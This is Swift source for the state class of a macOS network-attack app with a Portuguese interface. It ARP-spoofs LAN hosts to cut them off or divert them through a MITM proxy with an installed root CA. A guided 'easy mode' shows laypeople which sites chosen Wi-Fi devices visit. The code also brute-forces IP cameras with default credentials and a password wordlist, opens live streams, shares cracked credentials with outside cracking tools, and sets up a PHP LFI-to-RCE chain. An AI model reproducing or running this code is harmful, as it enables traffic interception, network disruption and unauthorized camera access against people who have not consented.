import Foundation
import SwiftUI
import Observation
import PastoralCore
import PastoralProxy

/// Which main tab is selected.
enum PastoralTab: String, Hashable, CaseIterable {
    case overview = "Visão geral"
    case arma = "Arma"
    case settings = "Configurações"
    case guided = "Modo guiado"
    case kill = "Kill"
    case sheep = "Sheep"
    case lobo = "Lobo"
    case inject = "Inject"
    case php = "PHP"
    case cameras = "Câmeras"
}

/// Top-level usage mode. `.simple` shows the guided 3-step wizard for
/// people who just want to see what the Wi-Fi devices are looking at;
/// `.advanced` keeps all the raw tabs.
enum UsageMode: String, CaseIterable, Identifiable {
    case simple = "Fácil"
    case advanced = "Avançado"
    var id: String { rawValue }
}

/// Steps of the guided ("leigo") flow.
enum EasyStep: Int, CaseIterable, Identifiable {
    case network = 1   // choose devices to watch
    case start = 2     // one big start button
    case watch = 3     // live list of sites/apps
    var id: Int { rawValue }

    var title: String {
        switch self {
        case .network: "Escolher dispositivos"
        case .start: "Começar"
        case .watch: "O que estão vendo"
        }
    }
}

/// Um servidor PHP em observação — detectado passivamente nos headers das
/// respostas capturadas, ou adicionado à mão (`ip[:porta][/caminho]`).
struct PhpTarget: Identifiable, Sendable {
    var id: String { "\(host):\(port)" }
    var host: String
    var port: Int
    var basePath: String
    /// Versão anunciada nos headers ("8.1.2"), quando o servidor fala.
    var phpVersionText: String? = nil
    var versionSource: String? = nil
    var passive: Bool = false
    /// Último relatório de probe.
    var report: PhpProbeReport? = nil
    // Cadeia A de RCE: sink LFI + diretório de sessão + comando.
    var lfiBase: String = ""              // ex.: "/vuln.php?page="
    var sessionDir: String = "/tmp/sessions"
    var command: String = "id"
    var rceOutput: String? = nil
}

/// Central app state, observable by all views. Coordinates the services
/// (helper client, ARP scanner, spoofer, proxy, CA) and exposes UI-facing
/// state. Runs on the main actor; services are wired in across delivery
/// steps 2–6. For the skeleton, operations are stubs that log.
@MainActor
@Observable
final class AppState {
    let log: LogStore

    // Network context (status bar)
    var network = NetworkInfo.placeholder
    var helper = HelperStatus.offline
    var readiness = LocalReadiness()

    // Hosts (shared by both tabs)
    var hosts: [Host] = []
    var isScanning = false

    // Kill tab
    var killGlobal = false
    /// When true, "Divert everyone" is active (force-path mode on all
    /// non-excluded hosts). Set by divertAll(), cleared by restoreAll().
    var divertGlobal = false
    /// Default direction for divert: bidirectional (full MITM, both
    /// directions) vs unidirectional (outbound-only, stealthier). User-
    /// toggleable in the Kill toolbar.
    var divertBidirectional = true

    // Sheep tab
    var sheepRunning = false
    var requests: [CapturedRequest] = []
    /// Full captured exchanges keyed by request ID, retained for replay
    /// (phase 5). Bounded to match `requests`.
    var capturedExchanges: [UUID: CapturedExchange] = [:]
    var requestTextFilter = ""
    var requestHostFilter: String? = nil
    var selectedRequestID: UUID?

    // QUIC/HTTP3 passive observations (Sheep tab). Populated from
    // `quicObservation` events emitted by the helper while sniffing.
    var quicObservations: [QUICObservation] = []
    var quicSniffing = false
    @ObservationIgnored private var quicClient: HelperClient?
    @ObservationIgnored private var mdnsClient: HelperClient?

    // Selective Kill (phase 3): per-host policies applied via the
    // `killSelective` helper command. Keyed by host IP.
    var selectivePolicies: [String: KillPolicy] = [:]
    /// Host currently showing the custom selective-policy sheet.
    var selectiveSheetHostID: String?

    // mDNS/LLMNR passive observations (phase 4). Populated from
    // `mdnsObservation` events emitted by the helper while sniffing.
    var mdnsObservations: [MDNSObservation] = []
    var mdnsSniffing = false

    // Host appearance/disappearance history (phase 4). Updated on each
    // ARP scan; persisted to disk for crash recovery.
    var hostHistory = HostHistory()

    // Replay (phase 5): captured request being replayed with modifications,
    // plus the most recent replay result for display.
    var replaySheetExchangeID: UUID? = nil
    var lastReplayResult: ReplayClient.ReplayResult? = nil
    var isReplaying = false

    // Tunnel (phase 6): WireGuard/Tailscale for remote Kill/Sheep.
    var tunnelInterface: String? = nil
    var tunnelHandshake: Int? = nil
    var tunnelRX: UInt64 = 0
    var tunnelTX: UInt64 = 0
    var tunnelSheetShown = false

    // Selection
    var selectedTab: PastoralTab = .overview

    // MARK: Easy mode (guiado / leigo)

    var usageMode: UsageMode = UserDefaults.standard.string(forKey: "pastoral.usageMode")
        .flatMap(UsageMode.init) ?? .simple {
        didSet { UserDefaults.standard.set(usageMode.rawValue, forKey: "pastoral.usageMode") }
    }
    var easyStep: EasyStep = .network
    /// MACs (Host.id) the user marked to watch in step 1.
    var easySelectedMACs: Set<String> = []
    /// Plain-language progress text while easyStart()/easyStop() run.
    var easyBusyPhase: String?

    /// Hosts that can be watched (excludes self, gateway, mcast/bcast).
    var observableHosts: [Host] {
        hosts.filter { !$0.isExcluded && !isMulticastOrBroadcast($0.ip) }
    }

    /// Per-site activity aggregated from captured requests, most active
    /// first. Cached against requests.count so it stays cheap to poll.
    struct SiteActivity: Identifiable {
        let site: String
        let count: Int
        let lastSeen: Date
        let isSecure: Bool
        var id: String { site }
    }
    @ObservationIgnored private var _siteCache: (count: Int, items: [SiteActivity])?
    var siteActivity: [SiteActivity] {
        if let cache = _siteCache, cache.count == requests.count { return cache.items }
        var agg: [String: (count: Int, last: Date, secure: Bool)] = [:]
        for req in requests {
            let site = (req.sni ?? req.host)
                .replacingOccurrences(of: "^www\\.", with: "", options: .regularExpression)
            var e = agg[site] ?? (0, req.timestamp, req.isTLS)
            e.count += 1
            e.last = max(e.last, req.timestamp)
            e.secure = e.secure || req.isTLS
            agg[site] = e
        }
        let out = agg
            .map { SiteActivity(site: $0.key, count: $0.value.count,
                                lastSeen: $0.value.last, isSecure: $0.value.secure) }
            .sorted { $0.count != $1.count ? $0.count > $1.count : $0.lastSeen > $1.lastSeen }
        _siteCache = (requests.count, out)
        return out
    }

    /// Guided start: divert exactly the selected hosts, start the proxy.
    func easyStart() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            return
        }
        let targets = observableHosts.filter { easySelectedMACs.contains($0.id) }
        guard !targets.isEmpty else {
            lastError = "Marque pelo menos um dispositivo na etapa 1."
            return
        }
        // Make the live divert set match the selection.
        for host in observableHosts where host.isDiverted && !easySelectedMACs.contains(host.id) {
            await toggleDivert(host)
        }
        for host in targets where !host.isDiverted {
            easyBusyPhase = "Preparando \(host.easyName)…"
            await toggleDivert(host)
        }
        if !sheepRunning {
            easyBusyPhase = "Ligando o observador…"
            await startSheep()
        }
        easyBusyPhase = nil
        if sheepRunning {
            log.info("easy mode: observando \(targets.count) dispositivo(s)")
            easyStep = .watch
        }
    }

    /// Guided stop: proxy off + full network restore.
    func easyStop() async {
        easyBusyPhase = "Parando e deixando a rede como estava…"
        if sheepRunning { await stopSheep() }
        let restored = await restoreAll()
        easyBusyPhase = nil
        if restored { easyStep = .start }
    }

    // Kill tab: filter to show only cameras.
    var killShowCamerasOnly = false

    // Cameras tab: detected cameras + live snapshots.
    var cameras: [CameraInfo] = []
    /// Snapshots keyed by CameraInfo.id (MAC). Populated on demand by
    /// snapshotCamera()/snapshotAllCameras().
    var cameraSnapshots: [String: CameraSnapshot] = [:]
    /// Camera ids currently being snapshotted (for spinner UI).
    var snapshotInProgress: Set<String> = []
    var cameraDetectionRunning = false
    private(set) var detectedCameraIPs: Set<String> = []

    // Live streaming: active RTSP streams + current decoded frames.
    /// Active stream clients keyed by camera id (MAC).
    private(set) var liveStreamClients: [String: RTSPStreamClient] = [:]
    /// Camera ids with an active live stream (for UI indicator).
    var liveStreamActive: Set<String> = []
    /// Latest decoded frame per camera, keyed by camera id.
    var liveFrames: [String: NSImage] = [:]
    /// Last live-stream error per camera, shown on the card.
    var liveStreamErrors: [String: String] = [:]
    /// Brute-force audit progress per camera, e.g. "senha 234/1530".
    var liveAuthProgress: [String: String] = [:]
    /// Per-camera RTSP credentials: entered manually or auto-discovered
    /// when a factory-default password worked. Persisted to UserDefaults
    /// so the live keeps working across app launches.
    var cameraCredentials: [String: (user: String, pass: String)] = [:]
    /// ONVIF devices found via WS-Discovery, keyed by IP. Carries the
    /// device service URL (xaddr) used to resolve exact stream URIs.
    private var onvifDevices: [String: OnvifDevice] = [:]

    /// Common camera/NVR passwords from the bundled wordlist
    /// (camera_passwords.txt). Used by the brute-force audit — "Força"
    /// button on the camera card.
    static let wordlistPasswords: [String] = {
        for bundle in [Bundle.main, AppResources.bundle] {
            if let url = bundle.url(forResource: "camera_passwords", withExtension: "txt"),
               let text = try? String(contentsOf: url, encoding: .utf8) {
                return text.split(separator: "\n").map {
                    $0.trimmingCharacters(in: .whitespacesAndNewlines)
                }.filter { !$0.isEmpty && !$0.hasPrefix("#") }
            }
        }
        return []
    }()

    /// Factory-default credentials tried automatically when a camera
    /// answers 401 — covering the common vendors' defaults. When one
    /// works it's an audit finding ("camera still uses default password").
    static let defaultCameraCredentials: [(user: String, pass: String)] = [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", ""),
        ("admin", "admin123"),
        ("admin", "1234"),
        ("root", "12345"),
        ("root", "root"),
        ("root", "pass"),
        ("user", "user")
    ]

    /// Generated extras appended to the brute-force wordlist: the numeric
    /// patterns people actually pick when the camera forces 8+ chars
    /// (TP-Link et al.). Kept small so the in-app audit stays short.
    static let wordlistExtras: [String] = {
        var s = Set<String>()
        for n in [12345678, 87654321, 123456789, 1234567890, 11223344, 22334455,
                  11112222, 12121212, 10101010, 13131313, 14141414, 11110000,
                  12341234, 14725836, 147258, 258741, 159753, 159357, 1472583,
                  1122334, 12131415, 5205201314, 0546123, 1314520, 7758521] {
            s.insert(String(n))
        }
        for c in Array("1234567890") { s.insert(String(repeating: c, count: 8)) }
        s.formUnion(["qwertyuiop", "abcdefghij", "asdfghjklz", "1q2w3e4r",
                     "1qaz2wsx", "zaq1xsw2", "passw0rd", "p@ssw0rd", "P@ssw0rd",
                     "Admin@123", "admin@123", "tp12345678", "admin8888",
                     "camera1234", "video1234", "senha1234", "root123456"])
        for base in ["admin", "pass", "camera", "video", "casa", "love"] {
            for n in [2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026] {
                s.insert("\(base)\(n)")
            }
        }
        return Array(s)
    }()

    /// Common RTSP stream paths tried when DESCRIBE on "/" fails —
    /// covers Hikvision, Dahua, Axis, Reolink, Tapo/VIGI, Eufy, Foscam,
    /// Uniview, Hanwha, GeoVision, generic ONVIF and cheap DVRs.
    static let commonStreamPaths: [String] = [
        "/11", "/12",
        "/live.sdp", "/live", "/live0",
        "/stream1", "/stream2",
        "/h264", "/h264/ch1/main/av_stream",
        "/Streaming/Channels/101", "/Streaming/Channels/102",
        "/Preview_01_main", "/h264Preview_01_main",
        "/cam/realmonitor?channel=1&subtype=0",
        "/onvif1", "/onvif2", "/media/video1",
        "/live/ch0", "/videoMain",
        "/axis-media/media.amp",
        "/unicast/c1/s0/live",
        "/profile1/media.smp",
        "/CH001.sdp"
    ]

    /// Credentials found by the outside tools (camera-scout, deepcrack)
    /// or by this app, keyed by IP, in the shared brain file.
    @ObservationIgnored private(set) var sharedCreds: [String: (user: String, pass: String)] = [:]

    @ObservationIgnored private static let credsFileURL: URL = {
        URL(fileURLWithPath: NSHomeDirectory())
            .appendingPathComponent("TESTMONEY/CRACKER/creds.json")
    }()

    /// Re-read the shared credentials brain (cheap local file).
    func reloadSharedCreds() {
        guard let data = try? Data(contentsOf: Self.credsFileURL),
              let obj = try? JSONSerialization.jsonObject(with: data) as? [String: [String: String]] else { return }
        var out: [String: (user: String, pass: String)] = [:]
        for (ip, e) in obj {
            guard let u = e["user"], let p = e["pass"] else { continue }
            out[ip] = (u, p)
        }
        sharedCreds = out
    }

    private func noteSharedCred(_ user: String, _ pass: String, ip: String) {
        guard !ip.isEmpty else { return }
        sharedCreds[ip] = (user, pass)
        var all: [String: [String: String]] = [:]
        if let data = try? Data(contentsOf: Self.credsFileURL),
           let obj = try? JSONSerialization.jsonObject(with: data) as? [String: [String: String]] {
            all = obj
        }
        all[ip] = ["user": user, "pass": pass]
        if let data = try? JSONSerialization.data(withJSONObject: all, options: [.prettyPrinted]) {
            // atômico: o scout/deepcrack leem e escrevem este arquivo em paralelo
            try? data.write(to: Self.credsFileURL, options: [.atomic])
        }
    }

    private static let credDefaultsKey = "pastoral.cameraCreds"

    private func persistCameraCredentials() {
        var dict: [String: [String]] = [:]
        for (k, v) in cameraCredentials { dict[k] = [v.user, v.pass] }
        UserDefaults.standard.set(dict, forKey: Self.credDefaultsKey)
    }

    private func loadCameraCredentials() {
        guard let dict = UserDefaults.standard.dictionary(forKey: Self.credDefaultsKey)
                as? [String: [String]] else { return }
        for (k, v) in dict where v.count == 2 && cameraCredentials[k] == nil {
            cameraCredentials[k] = (v[0], v[1])
        }
    }

    /// Candidate credentials for a camera: this camera's manual entry
    /// first, then any credential that worked on OTHER cameras (sites
    /// usually share one password), then the factory defaults.
    /// `isDefault` marks which came from the default list so the UI can
    /// flag "still using default password".
    private func credentialCandidates(for cameraID: String,
                                      includeWordlist: Bool = false)
        -> [(user: String, pass: String, isDefault: Bool)] {
        var out: [(user: String, pass: String, isDefault: Bool)] = []
        var seen = Set<String>()
        func add(_ user: String, _ pass: String, _ isDefault: Bool) {
            let key = "\(user)\u{0}\(pass)"
            guard seen.insert(key).inserted else { return }
            out.append((user, pass, isDefault))
        }
        if let manual = cameraCredentials[cameraID] {
            add(manual.user, manual.pass, false)
        }
        // Shared brain: anything the scout/deepcrack (or another session)
        // already cracked on this IP.
        let camIP = cameras.first { $0.id == cameraID }?.ip ?? ""
        if let sc = sharedCreds[camIP] {
            add(sc.user, sc.pass, false)
        }
        for cred in cameraCredentials.values {
            add(cred.user, cred.pass, false)
        }
        for def in Self.defaultCameraCredentials {
            add(def.user, def.pass, true)
        }
        if includeWordlist {
            // Brute-force audit: every wordlist password (+ generated
            // patterns) for the common camera usernames, admin first.
            let words = Array(Set(Self.wordlistPasswords + Self.wordlistExtras))
            for user in ["admin", "root", "user"] {
                for pw in words {
                    add(user, pw, true)
                }
            }
        }
        return out
    }

    /// Record a credential that successfully authenticated: store it for
    /// reuse (Snap/Live), persist it, and flag the card when it was a
    /// factory default.
    private func noteWorkingCredential(_ cred: (user: String, pass: String, isDefault: Bool),
                                       cameraID: String, ip: String) {
        cameraCredentials[cameraID] = (cred.user, cred.pass)
        persistCameraCredentials()
        noteSharedCred(cred.user, cred.pass, ip: ip)
        if cred.isDefault {
            if let i = cameras.firstIndex(where: { $0.id == cameraID }) {
                cameras[i].authNote = "senha padrão detectada — altere nas configurações da câmera"
            }
            log.warn("camera: \(ip) usa credenciais de fábrica — altere a senha no dispositivo.")
        }
    }

    /// Manual credential entry from the UI: persists and shares so the
    /// scout/deepcrack stop wasting attempts on this IP.
    func setManualCredential(user: String, pass: String, for cameraID: String, ip: String) {
        cameraCredentials[cameraID] = (user, pass)
        persistCameraCredentials()
        noteSharedCred(user, pass, ip: ip)
        log.info("camera: credenciais manuais salvas para \(ip)")
    }

    // Errors surfaced to UI
    var lastError: String?

    @ObservationIgnored private let stateStore: StateStore
    @ObservationIgnored private let restoreRequest: (HelperRequest) async throws -> HelperResponse
    private(set) var recoveryIPs: Set<String> = []
    private(set) var recoverySelectiveIPs: Set<String> = []
    private(set) var isRestoring = false
    var recoveryRequired = false
    var hasPendingRecovery: Bool {
        recoveryRequired || !recoveryIPs.isEmpty || !recoverySelectiveIPs.isEmpty || sheepRunning
            || hosts.contains { $0.isKilled || $0.isDiverted }
            || !selectivePolicies.isEmpty || quicSniffing || mdnsSniffing
    }

    init(statePath: String = StateStore.defaultPath,
         restoreRequest: ((HelperRequest) async throws -> HelperResponse)? = nil) {
        self.log = LogStore()
        self.stateStore = StateStore(path: statePath)
        self.restoreRequest = restoreRequest ?? { try await HelperClient().send($0) }
        self.loadCameraCredentials()
        self.reloadSharedCreds()
        self.loadHarvest()
    }

    // MARK: - Status (step 2)

    /// Probe the helper over /var/run/pastoral.sock and refresh local
    /// network context (interface, IP/MAC, gateway, SSID). Marks the
    /// helper offline if the socket is absent or unresponsive.
    func refreshStatus() async {
        readiness = LocalReadiness.read()
        let client = HelperClient()
        let status = await client.status()
        if let status {
            helper = status
            log.info("helper online — forwarding=\(status.forwarding) bpf=\(status.bpfAccessible) iface=\(status.interface ?? "?")")
        } else {
            helper = .offline
            log.warn("helper offline — socket /var/run/pastoral.sock sem resposta")
        }
        // Local network context needs no root; read it regardless so the
        // status bar always shows interface/IP/gateway.
        network = NetworkProbe.read()
    }

    // MARK: - Helper install (step 2)

    /// Locate the bundled pastoral-helper.pkg and run it with privileges.
    /// Tries AuthorizationExecuteWithPrivileges (runs /usr/sbin/installer);
    /// falls back to opening the pkg in Installer.app if authorization is
    /// unavailable. Re-probes status afterwards.
    func installHelper() async {
        guard let pkgURL = locateHelperPkg() else {
            lastError = AppError(.installFailed("pastoral-helper.pkg não encontrado no bundle")).description
            log.error(lastError!)
            return
        }
        log.info("instalando helper: \(pkgURL.path)")
        let ok = PrivilegedInstaller.install(pkg: pkgURL)
        if ok {
            log.info("helper instalado — re-probando status")
            // Give launchd a moment to register the socket.
            try? await Task.sleep(for: .milliseconds(800))
            await refreshStatus()
        } else {
            lastError = AppError(.installFailed("falha ao executar o instalador com privilégio")).description
            log.error(lastError!)
        }
    }

    /// Find pastoral-helper.pkg in the app bundle's Resources.
    private func locateHelperPkg() -> URL? {
        Bundle.main.url(forResource: "pastoral-helper", withExtension: "pkg")
    }

    // MARK: - Helpers

    /// Check if an IP is multicast (224.0.0.0/4) or broadcast (x.x.x.0/255).
    private func isMulticastOrBroadcast(_ ip: String) -> Bool {
        let parts = ip.split(separator: ".").compactMap { UInt32($0) }
        guard parts.count == 4 else { return true }
        if parts[0] >= 224 && parts[0] <= 239 { return true }
        if parts[3] == 0 || parts[3] == 255 { return true }
        return false
    }

    // MARK: - ARP scan (step 3)

    func scanARP() async {
        isScanning = true
        defer { isScanning = false }

        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("scanARP: helper offline")
            return
        }

        let client = HelperClient()
        do {
            let res = try await client.send(.scanARP)
            switch res {
            case .arpTable(let entries):
                mergeDiscoveredHosts(entries)
                classifyHosts()
                // Record host appearance/disappearance history (phase 4).
                let scanHosts = entries.map { (mac: $0.mac, ip: $0.ip,
                    vendor: ouiLookup?.vendor(forMAC: $0.mac)) }
                hostHistory.recordScan(scanHosts)
                log.info("scanARP: \(hosts.count) hosts descobertos")
            case .error(let msg):
                lastError = AppError(.helperCommandFailed(msg)).description
                log.error("scanARP: \(msg)")
            default:
                log.warn("scanARP: resposta inesperada do helper")
            }
        } catch {
            lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
            log.error("scanARP: \(error.localizedDescription)")
        }
    }

    /// Discovery never owns the recovery ledger: disappearing or renumbered
    /// devices must remain restorable by their original IP.
    func mergeDiscoveredHosts(_ entries: [ARPEntry]) {
        recoveryIPs.formUnion(hosts.filter { $0.isKilled || $0.isDiverted }.map(\.ip))
        let previous = Dictionary(hosts.map { ($0.id, $0) }, uniquingKeysWith: { first, _ in first })
        var seen = Set<String>()
        hosts = entries.compactMap { entry in
            guard seen.insert(entry.mac).inserted else { return nil }
            var host = Host(id: entry.mac, ip: entry.ip, mac: entry.mac)
            if let old = previous[entry.mac], old.ip == entry.ip { host = old }
            host.vendor = ouiLookup?.vendor(forMAC: entry.mac) ?? host.vendor
            if entry.ip == network.localIP || entry.ip == network.gatewayIP { host.isExcluded = true }
            return host
        }
        updateDirtyState()
    }

    /// OUI lookup loaded from the bundle's oui.json resource.
    private var ouiLookup: OUILookup? = {
        guard let url = Bundle.main.url(forResource: "oui", withExtension: "json"),
              let data = try? Data(contentsOf: url),
              let lookup = try? OUILookup(jsonData: data) else { return nil }
        return lookup
    }()

    // MARK: - Kill (step 4)

    func toggleKill(_ host: Host) async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("toggleKill: helper offline")
            return
        }
        guard let gatewayIP = network.gatewayIP else {
            lastError = AppError(.invalidInput("gateway não detectado")).description
            log.error("toggleKill: sem gateway")
            return
        }

        // Look up the CURRENT state of this host from the live hosts array,
        // not the stale copy passed in. This fixes the bug where toggling
        // a killed host always re-kills instead of releasing.
        guard let currentHost = hosts.first(where: { $0.id == host.id }) else { return }
        let isCurrentlyKilled = currentHost.isKilled

        let client = HelperClient()
        let targetIP = currentHost.ip

        if isCurrentlyKilled {
            // Liberação: parar spoof + remover regra pf.
            do {
                let res = try await client.send(.spoofStop(targetIP: targetIP))
                if case .ok = res {
                    updateHost(id: host.id) { $0.isKilled = false }
                    recoveryIPs.remove(targetIP)
                    log.info("liberado: \(targetIP)")
                }
            } catch {
                lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
                log.error("toggleKill stop: \(error.localizedDescription)")
            }
        } else {
            // Bloqueio: spoof.start + pf drop.
            do {
                let res = try await client.send(.spoofStart(targetIP: targetIP, gatewayIP: gatewayIP))
                switch res {
                case .ok:
                    updateHost(id: host.id) { $0.isKilled = true }
                    log.info("cortado: \(targetIP)")
                    markStateDirty()
                case .error(let msg):
                    lastError = AppError(.spoofFailed(msg)).description
                    log.error("toggleKill start: \(msg)")
                default:
                    break
                }
            } catch {
                lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
                log.error("toggleKill start: \(error.localizedDescription)")
            }
        }

        updateDirtyState()
    }

    func killAll() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            return
        }
        guard let gatewayIP = network.gatewayIP else {
            lastError = AppError(.invalidInput("gateway não detectado")).description
            return
        }

        let client = HelperClient()
        let targets = hosts.filter { !$0.isExcluded && !$0.isKilled && !isMulticastOrBroadcast($0.ip) }
        for host in targets {
            do {
                let res = try await client.send(.spoofStart(targetIP: host.ip, gatewayIP: gatewayIP))
                if case .ok = res {
                    updateHost(id: host.id) { $0.isKilled = true }
                    log.info("killAll: cortado \(host.ip)")
                }
            } catch {
                log.error("killAll: \(host.ip) — \(error.localizedDescription)")
            }
        }
        killGlobal = true
        updateDirtyState()
    }

    // MARK: - Divert (force-path mode)

    /// Toggle divert (force-path) on a single host. When diverted, the
    /// host's traffic is ARP-spoofed to flow through us and forwarding is
    /// enabled so the traffic relays to the real gateway instead of being
    /// dropped. This is the lever that makes Sheep MITM work even when we
    /// are not the target's natural gateway.
    func toggleDivert(_ host: Host) async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            log.error("toggleDivert: helper offline")
            return
        }
        guard let gatewayIP = network.gatewayIP else {
            lastError = AppError(.invalidInput("gateway não detectado")).description
            log.error("toggleDivert: sem gateway")
            return
        }

        // Use the live hosts array, not the stale copy.
        guard let currentHost = hosts.first(where: { $0.id == host.id }) else { return }
        let isCurrentlyDiverted = currentHost.isDiverted

        // A killed host cannot be diverted simultaneously (same ARP job).
        // Release the kill first if active.
        if currentHost.isKilled {
            do {
                _ = try await HelperClient().send(.spoofStop(targetIP: currentHost.ip))
                updateHost(id: host.id) { $0.isKilled = false }
            } catch {
                log.error("toggleDivert: failed to release kill on \(currentHost.ip)")
            }
        }

        let client = HelperClient()
        let targetIP = currentHost.ip

        if isCurrentlyDiverted {
            // Stop diverting.
            do {
                let res = try await client.send(.spoofStop(targetIP: targetIP))
                if case .ok = res {
                    updateHost(id: host.id) { $0.isDiverted = false }
                    recoveryIPs.remove(targetIP)
                    log.info("divert parado: \(targetIP)")
                }
            } catch {
                lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
                log.error("toggleDivert stop: \(error.localizedDescription)")
            }
        } else {
            // Start diverting.
            do {
                let res = try await client.send(.divertStart(
                    targetIP: targetIP, gatewayIP: gatewayIP,
                    bidirectional: divertBidirectional))
                switch res {
                case .ok:
                    updateHost(id: host.id) { $0.isDiverted = true }
                    let mode = divertBidirectional ? "bidir" : "unidir"
                    log.info("divertido (\(mode)): \(targetIP)")
                    markStateDirty()
                case .error(let msg):
                    lastError = AppError(.spoofFailed(msg)).description
                    log.error("toggleDivert start: \(msg)")
                default:
                    break
                }
            } catch {
                lastError = AppError(.helperSocketFailed(error.localizedDescription)).description
                log.error("toggleDivert start: \(error.localizedDescription)")
            }
        }

        updateDirtyState()
    }

    /// Divert all non-excluded, non-killed hosts at once. Useful for the
    /// "forced gateway" workflow: divert everyone, then start Sheep to
    /// intercept their traffic.
    func divertAll() async {
        guard helper.responding else {
            lastError = AppError(.helperMissing).description
            return
        }
        guard let gatewayIP = network.gatewayIP else {
            lastError = AppError(.invalidInput("gateway não detectado")).description
            return
        }

        let client = HelperClient()
        let targets = hosts.filter {
            !$0.isExcluded && !$0.isDiverted && !$0.isKilled && !isMulticastOrBroadcast($0.ip)
        }
        for host in targets {
            do {
                let res = try await client.send(.divertStart(
                    targetIP: host.ip, gatewayIP: gatewayIP,
                    bidirectional: divertBidirectional))
                if case .ok = res {
                    updateHost(id: host.id) { $0.isDiverted = true }
                    log.info("divertAll: desviando \(host.ip)")
                }
            } catch {
                log.error("divertAll: \(host.ip) — \(error.localizedDescription)")
            }
        }
        divertGlobal = true
        updateDirtyState()
    }

    // MARK: - Restore / shutdown (step 4)

    /// Only acknowledged cleanup is removed from the recovery ledger.
    @discardableResult
    func restoreAll() async -> Bool {
        guard hasPendingRecovery else { return true }
        guard !isRestoring else { return false }
        isRestoring = true
        defer { isRestoring = false }
        recoveryIPs.formUnion(hosts.filter { $0.isKilled || $0.isDiverted }.map(\.ip))
        loboPulseTask?.cancel()
        loboPulseTask = nil
        stopInjection()
        stopAllLiveStreams()
        if quicSniffing { await stopQUICSniffing() }
        if mdnsSniffing { await stopMDNSCapture() }
        guard helper.responding else {
            recoveryRequired = true
            updateDirtyState()
            lastError = "Serviço indisponível. A restauração continua pendente; tente novamente quando ele estiver conectado."
            return false
        }
        var failures: [String] = []
        for ip in recoveryIPs.sorted() {
            do {
                let response = try await restoreRequest(.spoofStop(targetIP: ip))
                guard case .ok = response else {
                    failures.append("\(ip): \(response)")
                    continue
                }
                recoveryIPs.remove(ip)
                for index in hosts.indices where hosts[index].ip == ip {
                    hosts[index].isKilled = false
                    hosts[index].isDiverted = false
                }
            } catch { failures.append("\(ip): \(error.localizedDescription)") }
        }
        // Clear redirect rules even after a crash, when the in-memory proxy
        // flag no longer exists. Keep the local proxy until cleanup succeeds.
        do {
            let response = try await restoreRequest(.sheepStop)
            if case .ok = response {
                proxy?.stop()
                proxy = nil
                sheepRunning = false
            } else { failures.append("Redirecionamento: \(response)") }
        } catch { failures.append("Redirecionamento: \(error.localizedDescription)") }
        // The current helper clears the entire selective anchor, not one IP.
        if let ip = recoverySelectiveIPs.union(selectivePolicies.keys).sorted().first {
            do {
                let response = try await restoreRequest(.killSelectiveClear(targetIP: ip))
                if case .ok = response {
                    selectivePolicies.removeAll()
                    recoverySelectiveIPs.removeAll()
                } else { failures.append("Políticas seletivas: \(response)") }
            } catch { failures.append("Políticas seletivas: \(error.localizedDescription)") }
        }
        recoveryRequired = !failures.isEmpty
        killGlobal = hosts.contains { $0.isKilled }
        divertGlobal = hosts.contains { $0.isDiverted }
        if failures.isEmpty { loboActive = false }
        let saved = persistRecoveryState()
        if failures.isEmpty && saved {
            lastError = nil
            log.info("Restauração confirmada pelo serviço.")
            return true
        }
        if !failures.isEmpty {
            lastError = "Restauração incompleta. " + failures.joined(separator: " · ")
            log.error(lastError!)
        }
        return false
    }

    // MARK: - Persistent recovery

    func checkCrashRecovery() {
        let saved = stateStore.load()
        guard saved.dirty else { return }
        recoveryIPs.formUnion(saved.spoofedIPs)
        recoverySelectiveIPs.formUnion(saved.selectiveIPs ?? [])
        recoveryRequired = true
        lastError = "A sessão anterior deixou uma restauração pendente. Use Restaurar rede."
        log.warn("Restauração pendente de uma sessão anterior.")
    }

    private func markStateDirty() { updateDirtyState() }

    private func markStateClean() { updateDirtyState() }

    private func updateDirtyState() {
        _ = persistRecoveryState()
    }

    @discardableResult
    private func persistRecoveryState() -> Bool {
        let active = Set(hosts.filter { $0.isKilled || $0.isDiverted }.map(\.ip))
        let ips = recoveryIPs.union(active)
        let policies = recoverySelectiveIPs.union(selectivePolicies.keys)
        let dirty = recoveryRequired || !ips.isEmpty || sheepRunning || !policies.isEmpty
        do {
            try stateStore.save(PastoralState(dirty: dirty, spoofedIPs: ips.sorted(), selectiveIPs: policies.sorted()))
            return true
        } catch {
            recoveryRequired = true
            lastError = "Não foi possível salvar o estado de recuperação: \(error.localizedDescription)"
            log.error(lastError!)
            return false
        }
    }

    private func updateHost(id: String, _ mutate: (inout Host) -> Void) {
        guard let i = hosts.firstIndex(where: { $0.id == id }) else { return }
        mutate(&hosts[i])
    }

    // MARK: - Sheep (step 5/6)

    private var proxy: TransparentProxy? = nil

    // MARK: - CA (MITM)
    //
    // O app faz a parte sem privilégio (garantir a CA, emitir folhas,
    // exportar o DER); a instalação da confiança no System.keychain
    // delega para o helper (root).

    @ObservationIgnored private var caManager: CAManager? = nil
    @ObservationIgnored private var caCertPath: String? = nil
    /// Estado de confiança da CA no sistema (nil = ainda não checado).
    var caTrusted: Bool? = nil

    /// Garante que a CA existe e está pronta para o proxy MITM.
    func ensureCAManager() {
        guard caManager == nil else { return }
        let m = CAManager()
        do {
            _ = try m.ensureCA()
        } catch {
            log.error("CA: ensureCA — \(error.localizedDescription)")
            return
        }
        if caCertPath == nil {
            caCertPath = try? m.exportCAToTemp()
        }
        caManager = m
        refreshCATrust()
    }

    /// Re-avalia se a CA está confiável no sistema.
    func refreshCATrust() {
        caTrusted = caManager?.isTrusted()
    }

    /// Instala (ou remove) a confiança da CA via helper (root).
    /// Retorna mensagem de erro, ou nil em sucesso.
    @discardableResult
    func setCATrust(_ install: Bool) async -> String? {
        ensureCAManager()
        guard let path = caCertPath else { return "CA não gerada" }
        let client = HelperClient()
        do {
            let req = install ? HelperRequest.caTrustInstall(path)
                              : HelperRequest.caTrustRemove(path)
            let res = try await client.send(req)
            refreshCATrust()
